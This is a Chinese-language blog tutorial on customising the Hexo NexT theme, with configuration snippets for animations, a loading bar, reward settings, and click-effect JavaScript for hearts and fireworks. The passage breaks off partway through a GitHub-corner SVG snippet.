<h2 id="文章版权信息"><a href="#文章版权信息" class="headerlink" title="文章版权信息"></a>文章版权信息</h2><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">creative_commons:</span></span><br><span class="line">  <span class="attr">license:</span> <span class="string">by-nc-sa</span></span><br><span class="line">  <span class="attr">sidebar:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">post:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">language:</span></span><br></pre></td></tr></table></figure>
<h2 id="动画"><a href="#动画" class="headerlink" title="动画"></a>动画</h2><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Use velocity to animate everything.</span></span><br><span class="line"><span class="attr">motion:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span>	<span class="comment">#开启动画</span></span><br><span class="line">  <span class="attr">async:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure>
<h3 id="动画背景"><a href="#动画背景" class="headerlink" title="动画背景"></a>动画背景</h3><p>克隆脚本到<code>themes/next/source/lib/three</code></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/theme-next/theme-next-three themes/next/<span class="built_in">source</span>/lib/three</span><br></pre></td></tr></table></figure>
<p>修改主题配置文件开启动态背景:</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># JavaScript 3D library.</span></span><br><span class="line"><span class="comment"># Dependencies: https://github.com/theme-next/theme-next-three</span></span><br><span class="line"><span class="attr">three:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">three_waves:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">canvas_lines:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">canvas_sphere:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># CDN 加速 找到相应行去掉注释即可启用</span></span><br><span class="line"><span class="attr">vendors:</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">three:</span> <span class="string">//cdn.jsdelivr.net/gh/theme-next/theme-next-three@1/three.min.js</span></span><br><span class="line">  <span class="attr">three_waves:</span> <span class="string">//cdn.jsdelivr.net/gh/theme-next/theme-next-three@latest/three-waves.min.js</span></span><br><span class="line">  <span class="comment"># canvas_lines: //cdn.jsdelivr.net/gh/theme-next/theme-next-three@latest/canvas_lines.min.js</span></span><br><span class="line">  <span class="comment"># canvas_sphere: //cdn.jsdelivr.net/gh/theme-next/theme-next-three@latest/canvas_sphere.min.js</span></span><br></pre></td></tr></table></figure>
<h3 id="顶部加载进度条"><a href="#顶部加载进度条" class="headerlink" title="顶部加载进度条"></a>顶部加载进度条</h3><p>克隆脚本到<code>themes/next/source/lib/pace</code></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/theme-next/theme-next-pace themes/next/<span class="built_in">source</span>/lib/pace</span><br></pre></td></tr></table></figure>
<p>修改主题配置文件:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pace:</span><br><span class="line">  enable: true</span><br><span class="line">  # Themes list:</span><br><span class="line">  # big-counter | bounce | barber-shop | center-atom | center-circle | center-radar | ce</span><br><span class="line">nter-simple</span><br><span class="line">  # corner-indicator | fill-left | flat-top | flash | loading-bar | mac-osx | material |</span><br><span class="line"> minimal</span><br><span class="line">  theme: minimal</span><br><span class="line"></span><br><span class="line"># CDN 加速 找到相应行去掉注释即可启用</span><br><span class="line">vendors:</span><br><span class="line"></span><br><span class="line">  pace: &#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;pace-js@1&#x2F;pace.min.js</span><br><span class="line">  pace_css: &#x2F;&#x2F;cdn.jsdelivr.net&#x2F;npm&#x2F;pace-js@1&#x2F;themes&#x2F;blue&#x2F;pace-theme-minimal.css</span><br></pre></td></tr></table></figure>
<h2 id="添加打赏"><a href="#添加打赏" class="headerlink" title="添加打赏"></a>添加打赏</h2><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Reward (Donate)</span></span><br><span class="line"><span class="attr">reward_settings:</span></span><br><span class="line">  <span class="comment"># 如果为true，则默认情况下会在每篇文章中显示奖励</span></span><br><span class="line">  <span class="comment"># 可以通过&quot; reward：true | false”在特定文章中显示或隐藏奖励</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">animation:</span> <span class="literal">false</span></span><br><span class="line">  <span class="comment">#comment: Donate comment here		#在这里发表评论</span></span><br><span class="line"></span><br><span class="line"><span class="attr">reward:</span></span><br><span class="line">  <span class="comment">#wechatpay: /images/wechatpay.png		#微信收款码</span></span><br><span class="line">  <span class="comment">#alipay: /images/alipay.png			#支付宝收款码</span></span><br><span class="line">  <span class="comment">#bitcoin: /images/bitcoin.png			#比特币收款</span></span><br></pre></td></tr></table></figure>
<h2 id="底部博客平台信息"><a href="#底部博客平台信息" class="headerlink" title="底部博客平台信息"></a>底部博客平台信息</h2><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Powered by Hexo &amp; NexT</span></span><br><span class="line">  <span class="attr">powered:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure>
<h1 id="自定义主题内容"><a href="#自定义主题内容" class="headerlink" title="自定义主题内容"></a>自定义主题内容</h1><h2 id="底部标签图标样式"><a href="#底部标签图标样式" class="headerlink" title="底部标签图标样式"></a>底部标签图标样式</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim themes/next/layout/_macro/post.swig</span><br></pre></td></tr></table></figure>
<p>将<code>rel=&quot;tag&quot;&gt;&#123;&#123; tag_indicate &#125;&#125;</code>改为：<code>rel=&quot;tag&quot;&gt;&lt;i class=&quot;fa fa-tag&quot;&gt;&lt;/i&gt;</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;&#123;&#123; url_for(tag.path) &#125;&#125;&quot; rel&#x3D;&quot;tag&quot;&gt;&lt;i class&#x3D;&quot;fa fa-tag&quot;&gt;&lt;&#x2F;i&gt; &#123;&#123; tag.name &#125;&#125;&lt;&#x2F;a&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="鼠标点击特效"><a href="#鼠标点击特效" class="headerlink" title="鼠标点击特效"></a>鼠标点击特效</h2><p>第一种(小心心)<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim themes/next/<span class="built_in">source</span>/js/clicklove.js	<span class="comment">#新建文件，并添加代码</span></span><br></pre></td></tr></table></figure></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">!<span class="function"><span class="keyword">function</span>(<span class="params">e,t,a</span>)</span>&#123;<span class="function"><span class="keyword">function</span> <span class="title">n</span>(<span class="params"></span>)</span>&#123;c(<span class="string">&quot;.heart&#123;width: 10px;height: 10px;position: fixed;background: #f00;transform: rotate(45deg);-webkit-transform: rotate(45deg);-moz-transform: rotate(45deg);&#125;.heart:after,.heart:before&#123;content: &#x27;&#x27;;width: inherit;height: inherit;background: inherit;border-radius: 50%;-webkit-border-radius: 50%;-moz-border-radius: 50%;position: fixed;&#125;.heart:after&#123;top: -5px;&#125;.heart:before&#123;left: -5px;&#125;&quot;</span>),o(),r()&#125;<span class="function"><span class="keyword">function</span> <span class="title">r</span>(<span class="params"></span>)</span>&#123;<span class="keyword">for</span>(<span class="keyword">var</span> e=<span class="number">0</span>;e&lt;d.length;e++)d[e].alpha&lt;=<span class="number">0</span>?(t.body.removeChild(d[e].el),d.splice(e,<span class="number">1</span>)):(d[e].y--,d[e].scale+=<span class="number">.004</span>,d[e].alpha-=<span class="number">.013</span>,d[e].el.style.cssText=<span class="string">&quot;left:&quot;</span>+d[e].x+<span class="string">&quot;px;top:&quot;</span>+d[e].y+<span class="string">&quot;px;opacity:&quot;</span>+d[e].alpha+<span class="string">&quot;;transform:scale(&quot;</span>+d[e].scale+<span class="string">&quot;,&quot;</span>+d[e].scale+<span class="string">&quot;) rotate(45deg);background:&quot;</span>+d[e].color+<span class="string">&quot;;z-index:99999&quot;</span>);requestAnimationFrame(r)&#125;<span class="function"><span class="keyword">function</span> <span class="title">o</span>(<span class="params"></span>)</span>&#123;<span class="keyword">var</span> t=<span class="string">&quot;function&quot;</span>==<span class="keyword">typeof</span> e.onclick&amp;&amp;e.onclick;e.onclick=<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;t&amp;&amp;t(),i(e)&#125;&#125;<span class="function"><span class="keyword">function</span> <span class="title">i</span>(<span class="params">e</span>)</span>&#123;<span class="keyword">var</span> a=t.createElement(<span class="string">&quot;div&quot;</span>);a.className=<span class="string">&quot;heart&quot;</span>,d.push(&#123;<span class="attr">el</span>:a,<span class="attr">x</span>:e.clientX-<span class="number">5</span>,<span class="attr">y</span>:e.clientY-<span class="number">5</span>,<span class="attr">scale</span>:<span class="number">1</span>,<span class="attr">alpha</span>:<span class="number">1</span>,<span class="attr">color</span>:s()&#125;),t.body.appendChild(a)&#125;<span class="function"><span class="keyword">function</span> <span class="title">c</span>(<span class="params">e</span>)</span>&#123;<span class="keyword">var</span> a=t.createElement(<span class="string">&quot;style&quot;</span>);a.type=<span class="string">&quot;text/css&quot;</span>;<span class="keyword">try</span>&#123;a.appendChild(t.createTextNode(e))&#125;<span class="keyword">catch</span>(t)&#123;a.styleSheet.cssText=e&#125;t.getElementsByTagName(<span class="string">&quot;head&quot;</span>)[<span class="number">0</span>].appendChild(a)&#125;<span class="function"><span class="keyword">function</span> <span class="title">s</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span><span class="string">&quot;rgb(&quot;</span>+~~(<span class="number">255</span>*<span class="built_in">Math</span>.random())+<span class="string">&quot;,&quot;</span>+~~(<span class="number">255</span>*<span class="built_in">Math</span>.random())+<span class="string">&quot;,&quot;</span>+~~(<span class="number">255</span>*<span class="built_in">Math</span>.random())+<span class="string">&quot;)&quot;</span>&#125;<span class="keyword">var</span> d=[];e.requestAnimationFrame=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span> e.requestAnimationFrame||e.webkitRequestAnimationFrame||e.mozRequestAnimationFrame||e.oRequestAnimationFrame||e.msRequestAnimationFrame||<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;<span class="built_in">setTimeout</span>(e,<span class="number">1e3</span>/<span class="number">60</span>)&#125;&#125;(),n()&#125;(<span class="built_in">window</span>,<span class="built_in">document</span>);</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim themes/next/laout/_layout.swig		<span class="comment">#body标签中添加</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!-- 页面点击小红心 --&gt;&lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;&#x2F;js&#x2F;clicklove.js&quot;&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
<p>另一种特效(烟花)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim themes/next/<span class="built_in">source</span>/js/fireworks.js	<span class="comment">#新建文件，并添加代码</span></span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;<span class="function"><span class="keyword">function</span> <span class="title">updateCoords</span>(<span class="params">e</span>)</span>&#123;pointerX=(e.clientX||e.touches[<span class="number">0</span>].clientX)-canvasEl.getBoundingClientRect().left,pointerY=e.clientY||e.touches[<span class="number">0</span>].clientY-canvasEl.getBoundingClientRect().top&#125;<span class="function"><span class="keyword">function</span> <span class="title">setParticuleDirection</span>(<span class="params">e</span>)</span>&#123;<span class="keyword">var</span> t=anime.random(<span class="number">0</span>,<span class="number">360</span>)*<span class="built_in">Math</span>.PI/<span class="number">180</span>,a=anime.random(<span class="number">50</span>,<span class="number">180</span>),n=[-<span class="number">1</span>,<span class="number">1</span>][anime.random(<span class="number">0</span>,<span class="number">1</span>)]*a;<span class="keyword">return</span>&#123;<span class="attr">x</span>:e.x+n*<span class="built_in">Math</span>.cos(t),<span class="attr">y</span>:e.y+n*<span class="built_in">Math</span>.sin(t)&#125;&#125;<span class="function"><span class="keyword">function</span> <span class="title">createParticule</span>(<span class="params">e,t</span>)</span>&#123;<span class="keyword">var</span> a=&#123;&#125;;<span class="keyword">return</span> a.x=e,a.y=t,a.color=colors[anime.random(<span class="number">0</span>,colors.length-<span class="number">1</span>)],a.radius=anime.random(<span class="number">16</span>,<span class="number">32</span>),a.endPos=setParticuleDirection(a),a.draw=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;ctx.beginPath(),ctx.arc(a.x,a.y,a.radius,<span class="number">0</span>,<span class="number">2</span>*<span class="built_in">Math</span>.PI,!<span class="number">0</span>),ctx.fillStyle=a.color,ctx.fill()&#125;,a&#125;<span class="function"><span class="keyword">function</span> <span class="title">createCircle</span>(<span class="params">e,t</span>)</span>&#123;<span class="keyword">var</span> a=&#123;&#125;;<span class="keyword">return</span> a.x=e,a.y=t,a.color=<span class="string">&quot;#F00&quot;</span>,a.radius=<span class="number">0.1</span>,a.alpha=<span class="number">0.5</span>,a.lineWidth=<span class="number">6</span>,a.draw=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;ctx.globalAlpha=a.alpha,ctx.beginPath(),ctx.arc(a.x,a.y,a.radius,<span class="number">0</span>,<span class="number">2</span>*<span class="built_in">Math</span>.PI,!<span class="number">0</span>),ctx.lineWidth=a.lineWidth,ctx.strokeStyle=a.color,ctx.stroke(),ctx.globalAlpha=<span class="number">1</span>&#125;,a&#125;<span class="function"><span class="keyword">function</span> <span class="title">renderParticule</span>(<span class="params">e</span>)</span>&#123;<span class="keyword">for</span>(<span class="keyword">var</span> t=<span class="number">0</span>;t&lt;e.animatables.length;t++)&#123;e.animatables[t].target.draw()&#125;&#125;<span class="function"><span class="keyword">function</span> <span class="title">animateParticules</span>(<span class="params">e,t</span>)</span>&#123;<span class="keyword">for</span>(<span class="keyword">var</span> a=createCircle(e,t),n=[],i=<span class="number">0</span>;i&lt;numberOfParticules;i++)&#123;n.push(createParticule(e,t))&#125;anime.timeline().add(&#123;<span class="attr">targets</span>:n,<span class="attr">x</span>:<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;<span class="keyword">return</span> e.endPos.x&#125;,<span class="attr">y</span>:<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;<span class="keyword">return</span> e.endPos.y&#125;,<span class="attr">radius</span>:<span class="number">0.1</span>,<span class="attr">duration</span>:anime.random(<span class="number">1200</span>,<span class="number">1800</span>),<span class="attr">easing</span>:<span class="string">&quot;easeOutExpo&quot;</span>,<span class="attr">update</span>:renderParticule&#125;).add(&#123;<span class="attr">targets</span>:a,<span class="attr">radius</span>:anime.random(<span class="number">80</span>,<span class="number">160</span>),<span class="attr">lineWidth</span>:<span class="number">0</span>,<span class="attr">alpha</span>:&#123;<span class="attr">value</span>:<span class="number">0</span>,<span class="attr">easing</span>:<span class="string">&quot;linear&quot;</span>,<span class="attr">duration</span>:anime.random(<span class="number">600</span>,<span class="number">800</span>)&#125;,<span class="attr">duration</span>:anime.random(<span class="number">1200</span>,<span class="number">1800</span>),<span class="attr">easing</span>:<span class="string">&quot;easeOutExpo&quot;</span>,<span class="attr">update</span>:renderParticule,<span class="attr">offset</span>:<span class="number">0</span>&#125;)&#125;<span class="function"><span class="keyword">function</span> <span class="title">debounce</span>(<span class="params">e,t</span>)</span>&#123;<span class="keyword">var</span> a;<span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">var</span> n=<span class="built_in">this</span>,i=<span class="built_in">arguments</span>;<span class="built_in">clearTimeout</span>(a),a=<span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;e.apply(n,i)&#125;,t)&#125;&#125;<span class="keyword">var</span> canvasEl=<span class="built_in">document</span>.querySelector(<span class="string">&quot;.fireworks&quot;</span>);<span class="keyword">if</span>(canvasEl)&#123;<span class="keyword">var</span> ctx=canvasEl.getContext(<span class="string">&quot;2d&quot;</span>),numberOfParticules=<span class="number">30</span>,pointerX=<span class="number">0</span>,pointerY=<span class="number">0</span>,tap=<span class="string">&quot;mousedown&quot;</span>,colors=[<span class="string">&quot;#FF1461&quot;</span>,<span class="string">&quot;#18FF92&quot;</span>,<span class="string">&quot;#5A87FF&quot;</span>,<span class="string">&quot;#FBF38C&quot;</span>],setCanvasSize=debounce(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;canvasEl.width=<span class="number">2</span>*<span class="built_in">window</span>.innerWidth,canvasEl.height=<span class="number">2</span>*<span class="built_in">window</span>.innerHeight,canvasEl.style.width=<span class="built_in">window</span>.innerWidth+<span class="string">&quot;px&quot;</span>,canvasEl.style.height=<span class="built_in">window</span>.innerHeight+<span class="string">&quot;px&quot;</span>,canvasEl.getContext(<span class="string">&quot;2d&quot;</span>).scale(<span class="number">2</span>,<span class="number">2</span>)&#125;,<span class="number">500</span>),render=anime(&#123;<span class="attr">duration</span>:<span class="number">1</span>/<span class="number">0</span>,<span class="attr">update</span>:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;ctx.clearRect(<span class="number">0</span>,<span class="number">0</span>,canvasEl.width,canvasEl.height)&#125;&#125;);<span class="built_in">document</span>.addEventListener(tap,<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;<span class="string">&quot;sidebar&quot;</span>!==e.target.id&amp;&amp;<span class="string">&quot;toggle-sidebar&quot;</span>!==e.target.id&amp;&amp;<span class="string">&quot;A&quot;</span>!==e.target.nodeName&amp;&amp;<span class="string">&quot;IMG&quot;</span>!==e.target.nodeName&amp;&amp;(render.play(),updateCoords(e),animateParticules(pointerX,pointerY))&#125;,!<span class="number">1</span>),setCanvasSize(),<span class="built_in">window</span>.addEventListener(<span class="string">&quot;resize&quot;</span>,setCanvasSize,!<span class="number">1</span>)&#125;<span class="string">&quot;use strict&quot;</span>;<span class="function"><span class="keyword">function</span> <span class="title">updateCoords</span>(<span class="params">e</span>)</span>&#123;pointerX=(e.clientX||e.touches[<span class="number">0</span>].clientX)-canvasEl.getBoundingClientRect().left,pointerY=e.clientY||e.touches[<span class="number">0</span>].clientY-canvasEl.getBoundingClientRect().top&#125;<span class="function"><span class="keyword">function</span> <span class="title">setParticuleDirection</span>(<span class="params">e</span>)</span>&#123;<span class="keyword">var</span> t=anime.random(<span class="number">0</span>,<span class="number">360</span>)*<span class="built_in">Math</span>.PI/<span class="number">180</span>,a=anime.random(<span class="number">50</span>,<span class="number">180</span>),n=[-<span class="number">1</span>,<span class="number">1</span>][anime.random(<span class="number">0</span>,<span class="number">1</span>)]*a;<span class="keyword">return</span>&#123;<span class="attr">x</span>:e.x+n*<span class="built_in">Math</span>.cos(t),<span class="attr">y</span>:e.y+n*<span class="built_in">Math</span>.sin(t)&#125;&#125;<span class="function"><span class="keyword">function</span> <span class="title">createParticule</span>(<span class="params">e,t</span>)</span>&#123;<span class="keyword">var</span> a=&#123;&#125;;<span class="keyword">return</span> a.x=e,a.y=t,a.color=colors[anime.random(<span class="number">0</span>,colors.length-<span class="number">1</span>)],a.radius=anime.random(<span class="number">16</span>,<span class="number">32</span>),a.endPos=setParticuleDirection(a),a.draw=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;ctx.beginPath(),ctx.arc(a.x,a.y,a.radius,<span class="number">0</span>,<span class="number">2</span>*<span class="built_in">Math</span>.PI,!<span class="number">0</span>),ctx.fillStyle=a.color,ctx.fill()&#125;,a&#125;<span class="function"><span class="keyword">function</span> <span class="title">createCircle</span>(<span class="params">e,t</span>)</span>&#123;<span class="keyword">var</span> a=&#123;&#125;;<span class="keyword">return</span> a.x=e,a.y=t,a.color=<span class="string">&quot;#F00&quot;</span>,a.radius=<span class="number">0.1</span>,a.alpha=<span class="number">0.5</span>,a.lineWidth=<span class="number">6</span>,a.draw=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;ctx.globalAlpha=a.alpha,ctx.beginPath(),ctx.arc(a.x,a.y,a.radius,<span class="number">0</span>,<span class="number">2</span>*<span class="built_in">Math</span>.PI,!<span class="number">0</span>),ctx.lineWidth=a.lineWidth,ctx.strokeStyle=a.color,ctx.stroke(),ctx.globalAlpha=<span class="number">1</span>&#125;,a&#125;<span class="function"><span class="keyword">function</span> <span class="title">renderParticule</span>(<span class="params">e</span>)</span>&#123;<span class="keyword">for</span>(<span class="keyword">var</span> t=<span class="number">0</span>;t&lt;e.animatables.length;t++)&#123;e.animatables[t].target.draw()&#125;&#125;<span class="function"><span class="keyword">function</span> <span class="title">animateParticules</span>(<span class="params">e,t</span>)</span>&#123;<span class="keyword">for</span>(<span class="keyword">var</span> a=createCircle(e,t),n=[],i=<span class="number">0</span>;i&lt;numberOfParticules;i++)&#123;n.push(createParticule(e,t))&#125;anime.timeline().add(&#123;<span class="attr">targets</span>:n,<span class="attr">x</span>:<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;<span class="keyword">return</span> e.endPos.x&#125;,<span class="attr">y</span>:<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;<span class="keyword">return</span> e.endPos.y&#125;,<span class="attr">radius</span>:<span class="number">0.1</span>,<span class="attr">duration</span>:anime.random(<span class="number">1200</span>,<span class="number">1800</span>),<span class="attr">easing</span>:<span class="string">&quot;easeOutExpo&quot;</span>,<span class="attr">update</span>:renderParticule&#125;).add(&#123;<span class="attr">targets</span>:a,<span class="attr">radius</span>:anime.random(<span class="number">80</span>,<span class="number">160</span>),<span class="attr">lineWidth</span>:<span class="number">0</span>,<span class="attr">alpha</span>:&#123;<span class="attr">value</span>:<span class="number">0</span>,<span class="attr">easing</span>:<span class="string">&quot;linear&quot;</span>,<span class="attr">duration</span>:anime.random(<span class="number">600</span>,<span class="number">800</span>)&#125;,<span class="attr">duration</span>:anime.random(<span class="number">1200</span>,<span class="number">1800</span>),<span class="attr">easing</span>:<span class="string">&quot;easeOutExpo&quot;</span>,<span class="attr">update</span>:renderParticule,<span class="attr">offset</span>:<span class="number">0</span>&#125;)&#125;<span class="function"><span class="keyword">function</span> <span class="title">debounce</span>(<span class="params">e,t</span>)</span>&#123;<span class="keyword">var</span> a;<span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">var</span> n=<span class="built_in">this</span>,i=<span class="built_in">arguments</span>;<span class="built_in">clearTimeout</span>(a),a=<span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;e.apply(n,i)&#125;,t)&#125;&#125;<span class="keyword">var</span> canvasEl=<span class="built_in">document</span>.querySelector(<span class="string">&quot;.fireworks&quot;</span>);<span class="keyword">if</span>(canvasEl)&#123;<span class="keyword">var</span> ctx=canvasEl.getContext(<span class="string">&quot;2d&quot;</span>),numberOfParticules=<span class="number">30</span>,pointerX=<span class="number">0</span>,pointerY=<span class="number">0</span>,tap=<span class="string">&quot;mousedown&quot;</span>,colors=[<span class="string">&quot;#FF1461&quot;</span>,<span class="string">&quot;#18FF92&quot;</span>,<span class="string">&quot;#5A87FF&quot;</span>,<span class="string">&quot;#FBF38C&quot;</span>],setCanvasSize=debounce(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;canvasEl.width=<span class="number">2</span>*<span class="built_in">window</span>.innerWidth,canvasEl.height=<span class="number">2</span>*<span class="built_in">window</span>.innerHeight,canvasEl.style.width=<span class="built_in">window</span>.innerWidth+<span class="string">&quot;px&quot;</span>,canvasEl.style.height=<span class="built_in">window</span>.innerHeight+<span class="string">&quot;px&quot;</span>,canvasEl.getContext(<span class="string">&quot;2d&quot;</span>).scale(<span class="number">2</span>,<span class="number">2</span>)&#125;,<span class="number">500</span>),render=anime(&#123;<span class="attr">duration</span>:<span class="number">1</span>/<span class="number">0</span>,<span class="attr">update</span>:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;ctx.clearRect(<span class="number">0</span>,<span class="number">0</span>,canvasEl.width,canvasEl.height)&#125;&#125;);<span class="built_in">document</span>.addEventListener(tap,<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;<span class="string">&quot;sidebar&quot;</span>!==e.target.id&amp;&amp;<span class="string">&quot;toggle-sidebar&quot;</span>!==e.target.id&amp;&amp;<span class="string">&quot;A&quot;</span>!==e.target.nodeName&amp;&amp;<span class="string">&quot;IMG&quot;</span>!==e.target.nodeName&amp;&amp;(render.play(),updateCoords(e),animateParticules(pointerX,pointerY))&#125;,!<span class="number">1</span>),setCanvasSize(),<span class="built_in">window</span>.addEventListener(<span class="string">&quot;resize&quot;</span>,setCanvasSize,!<span class="number">1</span>)&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim themes/next/laout/_layout.swig		<span class="comment">#添加</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% if theme.fireworks %&#125;   &lt;canvas class&#x3D;&quot;fireworks&quot; style&#x3D;&quot;position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;&quot; &gt;&lt;&#x2F;canvas&gt;    &lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;&#x2F;&#x2F;cdn.bootcss.com&#x2F;animejs&#x2F;2.2.0&#x2F;anime.min.js&quot;&gt;&lt;&#x2F;script&gt;    &lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;&#x2F;js&#x2F;fireworks.js&quot;&gt;&lt;&#x2F;script&gt;&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim _config.next.yml		<span class="comment">#在主题文件中加入</span></span><br></pre></td></tr></table></figure>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Fireworksfireworks: true</span></span><br></pre></td></tr></table></figure>
<h2 id="github角落及丝带"><a href="#github角落及丝带" class="headerlink" title="github角落及丝带"></a>github角落及丝带</h2><p>在<a href="http://tholman.com/github-corners/">GitHub Corners（角落）</a>或<a href="https://github.blog/2008-12-19-github-ribbons/">GitHub Ribbons（丝带）</a>选择一款你喜欢的挂饰，拷贝方框内的代码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim themes/next/layout/_layout.swig		<span class="comment">#将代码加入&lt;div class=&quot;headband&quot;&gt;&lt;/div&gt;下方</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#修改自己的github链接（https://github.com/eonun）</span></span><br></pre></td></tr></table></figure>
<p>右上角蓝底:</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://github.com/eonun&quot;</span> <span class="attr">class</span>=<span class="string">&quot;github-corner&quot;</span> <span class="attr">aria-label</span>=<span class="string">&quot;View source on GitHub&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">svg</span> <span class="attr">width</span>=<span class="string">&quot;80&quot;</span> <span class="attr">height</span>=<span class="string">&quot;80&quot;</span> <span class="attr">viewBox</span>=<span class="string">&quot;0 0 250 250&quot;</span> <span class="attr">style</span>=<span class="string">&quot;fill:#70B7FD; color:#fff; position: absolute; top: 0; border: 0; right: 0;&quot;</span> <span class="attr">aria-hidden</span>=<span class="string">&quot;true&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">path</span> <span class="attr">d</span>=<span class="string">&quot;M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">path</span>&gt;</span><span class="tag">&lt;<span class="name">path</span> <span class="attr">d</span>=<span class="string">&quot;M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2&quot;</span> <span class="attr">fill</span>=<span class="string">&quot;currentColor&quot;</span> <span class="attr">style</span>=<span class="string">&quot;transform-origin: 130px 106px;&quot;</span> <span class="attr">class</span>=<span class="string">&quot;octo-arm&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">path</span>&gt;</span><span class="tag">&lt;<span class="name">path</span> <span class="attr">d</span>=<span class="string">&quot;M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z&quot;</span> <span class="attr">fill</span>=<span class="string">&quot;currentColor&quot;</span> <span class="attr">class</span>=<span class="string">&quot;octo-body&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">path</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span><span 